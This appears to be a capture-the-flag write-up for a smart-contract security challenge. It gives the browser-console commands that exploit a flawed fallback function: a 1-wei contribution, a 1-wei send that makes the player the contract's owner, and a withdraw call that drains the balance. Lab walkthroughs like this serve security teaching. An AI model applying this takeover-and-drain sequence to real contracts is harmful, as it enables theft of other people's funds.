## Explanation

Requires you to exploit a poorly implemented [Fallback Function](https://docs.soliditylang.org/en/v0.8.10/contracts.html?highlight=Fallback#fallback-function) to gain control of someone else’s smart contract..

## Solution in console

To solve challange in browser console it is necessary to write:
```bash
# Show contract abi in a table
console.table(contract.abi)
# Show contract owner
await contract.owner();
# Send one Wei to contribute()
await contract.contribute.sendTransaction({value: 1})
# We can see that "contributions[msg.sender] > 0" will give "true" value
console.table(await contract.contributions(player))
# Send one Wei to the fallback function to become owner
await contract.sendTransaction({value: 1});
# Our address
player;
# We can see that our address is set as an owner
await contract.owner();
# Reduce contract balance to 0
await contract.withdraw();
```